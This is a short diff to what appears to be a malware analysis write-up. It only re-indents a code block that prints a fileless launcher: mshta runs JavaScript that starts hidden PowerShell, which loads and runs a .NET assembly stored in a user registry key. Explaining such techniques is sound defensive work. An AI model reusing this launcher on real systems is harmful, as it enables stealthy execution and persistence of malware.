@@ -34,18 +34,18 @@ This is a formatted version of the above line:
 
 ```
 mshta "
-	javascript:close(
-		new ActiveXObject('WScript.Shell')
-			.run('
-				powershell \"
-					[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser
-						.OpenSubKey(\\\"Software\\\\Microsoft\\\\Internet Explorer\\\")
-						.GetValue($Null))
-						.EntryPoint
-						.Invoke(0,$Null)
-				\"
-			',0)
-	)
+    javascript:close(
+        new ActiveXObject('WScript.Shell')
+            .run('
+                powershell \"
+                    [Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser
+                        .OpenSubKey(\\\"Software\\\\Microsoft\\\\Internet Explorer\\\")
+                        .GetValue($Null))
+                        .EntryPoint
+                        .Invoke(0,$Null)
+                \"
+            ',0)
+    )
 "
 ```
 
